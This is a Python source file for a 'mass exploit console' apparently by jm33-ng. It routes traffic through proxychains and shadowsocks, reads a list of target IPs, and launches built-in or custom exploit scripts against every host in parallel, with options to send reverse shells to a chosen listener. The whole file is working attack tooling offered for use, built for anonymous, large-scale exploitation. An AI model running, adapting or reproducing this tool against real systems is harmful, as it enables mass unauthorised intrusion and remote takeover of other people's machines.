#!/usr/bin/python3
# pylint: disable=too-many-instance-attributes,too-many-statements,too-many-branches,too-many-locals,too-many-nested-blocks,broad-except,too-few-public-methods,too-many-arguments

'''
mass exploit console
by jm33-ng
'''

import os
import shutil
import subprocess
import sys
import time
import traceback
from multiprocessing import Process

import psutil
import tqdm

from lib.cli import cmd, colors, console
from lib.cli import exploits as exploit_exec
from lib.cli import futil, proxy

# mec root directory
MECROOT = os.path.join(os.path.expanduser("~"), ".mec")


class Session:

    '''
    define parameters for a session
    '''

    def __init__(self):
        # root directory of mec
        self.init_dir = MECROOT
        # where to put temp files
        self.out_dir = self.init_dir + '/output'
        # where to put proxychains4 config file
        self.proxy_conf = self.init_dir + \
            '/data/proxy.conf'
        # where to put shadowsocks binary
        proxy_bin = self.init_dir + \
            '/tools/ss-proxy'
        # where to put shadowsocks config file
        ss_config = self.init_dir + \
            '/data/ss.json'
        # save output of exploits
        self.logfile = self.init_dir + \
            '/output/' + \
            time.strftime("%Y_%m_%d_%H_%M_%S.log")

        # whether to use proxychains4
        self.use_proxy = True
        # shadowsocks helper
        self.shadowsocks = proxy.ShadowsocksProxy(
            proxy_bin, ss_config)
        # is our proxy working?
        self.proxy_status = "OFF"
        # config file of proxychains4
        self.proxychains_conf = self.shadowsocks.proxychains_conf
        # target IP list
        self.ip_list = self.init_dir + \
            '/data/ip_list.txt'

        # are we root?
        self.is_root = os.geteuid() == 0

    def command(self, user_cmd):
        '''
        passes to cmd handler
        '''
        cmd.cmd_handler(self, user_cmd)

    def attack(self):
        '''
        handles attack command
        '''
        self.use_proxy = console.input_check(
            '[?] Do you wish to use proxychains? [y/n] ',
            choices=['y', 'n']) == 'y'

        if self.use_proxy:
            if shutil.which("proxychains4") is None:
                console.print_error("proxychains4 not found")

                return
            cmd.cmd_handler(self, "proxy")
        answ = console.input_check(
            '\n[?] Do you wish to use\
            \n\n    [a] built-in exploits\
            \n    [m] or launch your own manually?\
            \n\n[=] Your choice: ',
            choices=['a', 'm'])

        if answ == 'a':
            print(
                colors.CYAN +
                colors.BOLD +
                '\n[?] Choose a module from: ' +
                colors.END +
                '\n')
            colors.colored_print(futil.BUILT_IN, colors.GREEN)
            module = console.input_check(
                "[?] Choose your exploit module: ",
                choices=futil.BUILT_IN.split('\n'),
                allow_blank=False)

            try:
                scanner_instance = exploit_exec.EXPLOIT_DICT.get(module)(self)
                if scanner_instance is None:
                    return
                scanner_instance.scan()

            except (EOFError, KeyboardInterrupt, SystemExit):
                return

        elif answ == 'm':
            print(
                colors.CYAN +
                colors.UNDERLINE +
                colors.BOLD +
                "\nWelcome, in here you can choose your own exploit\n" +
                colors.END)
            colors.colored_print(
                '[*] Here are available exploits:\n', colors.CYAN)

            for poc in futil.list_exp():
                colors.colored_print(poc + colors.END, colors.BLUE)

            exploit = console.input_check(
                "\n[*] Enter the path (eg. joomla/rce.py) of your exploit: ",
                choices=futil.list_exp())

            jobs = int(
                console.input_check("[?] How many processes each time? ", check_type=int))

            custom_args = []
            answ = console.input_check(
                "[?] Do you need a reverse shell [y/n]? ", choices=['y', 'n'])

            if answ == 'y':
                lhost = console.input_check(
                    "[*] Where do you want me to send shells? ", allow_blank=False, ip_check=True)
                lport = console.input_check(
                    "[*] and at what port?",
                    check_type=int)
                custom_args = ['-l', lhost, '-p', lport]
            else:
                pass

            custom_args += console.input_check(
                "[*] args for this exploit: ").strip().split()

            # parse user's exploit name
            exec_path = exploit.split('/')[1:]
            work_path = exploit.split('/')[:-1]
            exec_path = '/'.join(exec_path)
            work_path = '/'.join(work_path)

            # let user check if there's anything wrong
            print(
                colors.BLUE +
                '[*] Your exploit will be executed like\n' +
                colors.END,
                'proxychains4 -q -f proxy.conf {} -t <target ip>'.format(
                    exec_path),
                ' '.join(custom_args))

            # args as parameter for scanner
            scanner_instance = Scanner(work_path, exec_path,
                                       custom_args,
                                       jobs, self)
            # start scanner
            scanner_instance.scan()

        else:
            console.print_error('[-] Invalid input')


class Scanner:

    '''
    scanner_args = (
        work_path,
        exec_path,
        custom_args,
        jobs,
        session)
    '''

    def __init__(self,
                 work_path,
                 exec_path,
                 custom_args,
                 jobs,
                 session):

        self.work_path = work_path
        self.exec_path = exec_path
        self.custom_args = custom_args
        self.jobs = jobs
        self.session = session

    def scan(self):
        '''
        Execute exploit against given ip list
        '''

        try:
            work_path, exec_path = self.work_path, self.exec_path
            custom_args, jobs = self.custom_args, self.jobs
        except BaseException:
            console.print_error("[-] Invalid config")

            return

        if self.session.use_proxy:
            e_args = [
                'proxychains4',
                '-f',
                self.session.proxy_conf,
                './' + exec_path]
        else:
            e_args = ['./' + exec_path]

        # add custom arguments for different exploits
        e_args += custom_args
        # the last argument is target host
        e_args += ['-t']

        try:
            target_list = open(self.session.ip_list)
        except BaseException as exc:
            console.print_error('[-] Error occured: {}\n'.format(exc))
            console.debug_except()

            return

        try:
            os.chdir('./exploits/' + work_path)
        except FileNotFoundError:
            console.print_error("[-] Can't chdir to " + work_path)
            console.debug_except()
        console.print_warning(
            '\n[!] DEBUG: ' + str(e_args) + '\nWorking in ' + os.getcwd())

        # you might want to cancel the scan to correct some errors

        if console.input_check('[?] Proceed? [y/n] ', choices=['y', 'n']) == 'n':
            return

        # save stdout to logfile
        try:
            logfile = open(self.session.logfile, "a+")
        except FileNotFoundError:
            console.print_error("[-] Log file not found")

        # needed for the loop
        procs = []
        pool = []  # holds all processes, check if empty when finishing
        count = len(procs)

        # display help for viewing logs
        print(colors.CYAN +
              "[*] Use `tail -f {}` to view logs\n\n".format(self.session.logfile))

        # use progress bar
        with open(self.session.ip_list) as iplistf:
            total = len([0 for _ in iplistf])
            iplistf.close()
        pbar = tqdm.tqdm(total=total, ncols=80, desc="[*] Processing targets")

        for line in target_list:
            target_ip = line.strip()

            # mark this loop as done
            count = len(procs)

            try:
                # start and display current process
                e_args += [target_ip]

                proc = subprocess.Popen(e_args, stdout=logfile, stderr=logfile)
                procs.append(proc)
                pool.append(proc)
                pbar.set_description(
                    desc="[*] Processing {}".format(target_ip))

                # continue to next target
                e_args.remove(target_ip)

                # process pool

                if count == jobs:
                    for item in procs:
                        if psutil.pid_exists(item.pid):
                            timer_proc = Process(
                                target=futil.proc_timer, args=(item, ))
                            timer_proc.start()
                        else:
                            pool.remove(item)

                    procs = []

            except (EOFError, KeyboardInterrupt, SystemExit):
                console.print_error("[-] Task aborted")

                break

            except BaseException as exc:
                logfile.write("[-] Exception: " + str(exc) + "\n")

            finally:
                # check if any procs are done, remove them from pool, update progress bar
                try:
                    for proc in pool:
                        if proc.poll() is not None:
                            pool.remove(proc)
                            pbar.update(1)
                except BaseException:
                    logfile.write("[-] Exception: " +
                                  traceback.format_exc() + "\n")

        # make sure all processes are done

        if pool:
            for proc in pool:
                try:
                    proc.terminate()
                    proc.wait()
                except (EOFError, KeyboardInterrupt, SystemExit):
                    pass

        # close logfile, exit progress bar, and print done flag
        logfile.close()
        pbar.close()
        os.chdir(self.session.init_dir)
        console.print_success('\n[+] All done!\n')

        # this fixes #37, because when parent gets killed, all zombie children die
        sys.exit()
